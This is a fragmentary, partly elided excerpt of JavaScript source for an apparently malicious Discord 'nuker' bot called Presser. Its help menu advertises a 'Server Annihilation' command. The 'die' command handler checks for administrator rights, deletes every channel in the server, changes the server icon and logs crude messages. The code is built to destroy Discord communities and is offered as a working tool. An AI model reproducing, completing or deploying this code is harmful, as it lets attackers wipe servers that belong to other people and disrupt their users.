...
\` [text]
            ...
            **Server Annihilation:** \`${prefix}die\` [text]
            `)
            .setThumbnail(``)
            .setFooter(`© Presser | Prefix: ${prefix} | Author: Velqy | Cord: ${founder}`)
            .setColor(0x36393E)
    ...
    if (!DisableEveryone) {
        ...
        if (message.content.startsWith(prefix + 'help')) {
            const helpEmbed = new MessageEmbed()
                ...
                **Server Annihilation:** \`${prefix}die\` [text]
                `)
                .setImage(`https://cdn.discordapp.com/attachments/850948254669733930/850948287669338132/unnamed.gif`)
                .setFooter(`© Presser | Prefix: ${prefix} | Author: Velqy | Cord: ${founder}`)
                .setColor(0x36393E)
                .setTimestamp(Date.now());
            message.channel.send(helpEmbed);
        ...
        if (message.content.startsWith(prefix + 'die')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
                ...
                message.guild.channels.cache.forEach((ch) => {
                    ch.delete().then(() => {
                        // Channel Icon Change
                        message.guild.setIcon('https://cdn.discordapp.com/attachments/850948254669733930/850948287669338132/unnamed.gif') // changes server pfp
                        console.log(redBright(`CHANNEL FUCKED`));
                    }).catch((err) => {
                        console.log(red("ERROR: " + err))
                    })
